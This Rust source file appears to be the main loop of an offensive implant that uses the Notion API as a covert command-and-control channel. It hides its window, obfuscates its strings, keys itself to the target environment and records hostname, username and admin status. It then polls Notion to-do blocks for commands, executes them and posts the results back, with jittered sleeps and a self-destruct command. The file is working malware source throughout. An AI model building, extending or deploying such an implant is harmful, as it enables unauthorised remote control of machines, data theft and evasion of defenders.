#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
extern crate reqwest;
extern crate tokio;
extern crate serde_json;
extern crate whoami;
extern crate base64;
extern crate litcrypt;

use std::{thread, time};
use std::env::args;
use std::process::exit;
use std::process::Command;
use rand::prelude::*;

use whoami::hostname;
use reqwest::Client;
use reqwest::header::{HeaderMap, AUTHORIZATION, CONTENT_TYPE};
use base64::decode;
use litcrypt::{lc, use_litcrypt};

mod config;
use config::{
    ConfigOptions,
    get_config_options, 
    load_config_options
};

mod notion;
use notion::{get_blocks, complete_command, create_page, send_result};

mod cmd;
use cmd::{NotionCommand, CommandType};
mod logger;
use logger::log_out;
mod env_check;

use_litcrypt!();

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    
    println!("{}", lc!("[*] Starting!"));
    
    // Handle config options
    let mut config_options: ConfigOptions;

    // Check for command line options
    // -d: debug mode
    // -c: config file
    // -b: ingest base64 decode
    match args().nth(1) {
        Some(a) => {
            if a == "-c" {
                let config_file_path = args().nth(2).unwrap();
                config_options = load_config_options(Some(config_file_path.as_str())).await?;
            } else if a == "-b" { 
                let b64_string = args().nth(2).unwrap().replace(" ", "");
                let config_string = String::from_utf8(
                    decode(b64_string.as_str())?
                )?;
                config_options = serde_json::from_str(config_string.as_str())?;
            } else {
                config_options = get_config_options().await?;
            }
        },
        None => {
            config_options = load_config_options(None).await?;
        }
    }

    let logger = logger::Logger::new(config_options.log_level);

    // Start Notion App if configured to do so
    if config_options.launch_app {
        logger.info(log_out!("Launching app"));
        let browser_cmd: String;
        #[cfg(windows)] {
            browser_cmd = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe".to_string();
        }
        #[cfg(target_os = "linux")] {
            browser_cmd = lc!("/usr/local/bin/google-chrome");
        }
        #[cfg(target_os = "macos")] {
            // For Mac, since we can't launch Chrome, we're gonna have to 
            // Hope Chrome is there for us to abuse.
            browser_cmd = lc!("/Applications/Google Chrome.app/Contents/MacOS/Google Chrome");
        }
        match Command::new(browser_cmd)
        .arg("--app=https://notion.so")
        .spawn() {
            Ok(_) => {logger.info(lc!("Launching browser"));},
            Err(e) => {logger.err(e.to_string());}
        };
    }

    // Before anything else happens, we key to the env if the config has been set.
    // match the keyed results. This is boiled down to a bool to account for any type of keying (by username, domain, etc)
    if env_check::check_env_keys(&config_options).await {
        logger.info(log_out!("Keys match; continuing..."))
    } else {
        logger.crit(log_out!("Env check failure. Shutting down..."));
        exit(1)
    }

    let mut hn = hostname();
    let username = whoami::username();
    hn.push_str(" | ");
    hn.push_str(&username);
    let is_admin = cmd::getprivs::is_elevated();  
    logger.info(format!("Admin context: {}", is_admin));
    if is_admin {
        hn.push_str("*");
    }

    logger.info(log_out!("Hostname: ", &hn));
    logger.debug(format!("Config options: {:?}", config_options));

    let mut headers = HeaderMap::new();
    headers.insert("Notion-Version", "2021-08-16".parse()?);
    headers.insert(CONTENT_TYPE, "application/json".parse()?);
    headers.insert(AUTHORIZATION, format!("Bearer {}", config_options.api_key).parse()?);
    let client = Client::builder()
        .default_headers(headers)
        .build()?;

    let page_id = create_page(&client, &config_options, hn, &logger, is_admin)
        .await
        .unwrap();
    
    loop {
        // Get Blocks
        let blocks = get_blocks(&client, &page_id).await?;

        let command_blocks: Vec<&serde_json::Value> = blocks
            .as_array()
            .unwrap()
            .into_iter()
            .filter(|&b| b["type"] == "to_do")
            .collect();

        let new_command_blocks: Vec<&serde_json::Value> = command_blocks
            .into_iter()
            .filter(|&b| b["to_do"]["checked"] == false)
            .collect();

        for block in new_command_blocks {
            match block["to_do"]["text"][0]["text"]["content"].as_str() {
                Some(s) => {
                    if s.contains("🎯") {
                        logger.info(log_out!("Got command: ", s));
                        let mut notion_command = NotionCommand::from_string(s.replace("🎯",""))?;
                        let output = notion_command.handle(&mut config_options, &logger).await?;
                        let command_block_id = block["id"].as_str().unwrap();
                        complete_command(&client, block.to_owned(), &logger).await;
                        send_result(&client, command_block_id, output, &logger).await;
                        // Check for any final work based on command type,
                        // Like shutting down the agent
                        match notion_command.command_type {
                            CommandType::Shutdown => {exit(0);},
                            CommandType::Selfdestruct => {exit(0)},
                            _ => {}
                        }
                    };

                },
                None => { continue; }
            }
        }

        // Handle jitter
        let mut rng = rand::thread_rng();
        let jitter_time = rng.gen_range(0..config_options.jitter_time + 1);
        let sleep_time = 
            time::Duration::from_secs(config_options.sleep_interval + jitter_time);

        thread::sleep(sleep_time);
        logger.info(log_out!("zzzZZZzzz: ", &config_options.sleep_interval.to_string(), "seconds"));
        logger.debug(log_out!("Jitter: ", &config_options.jitter_time.to_string()));
    }
}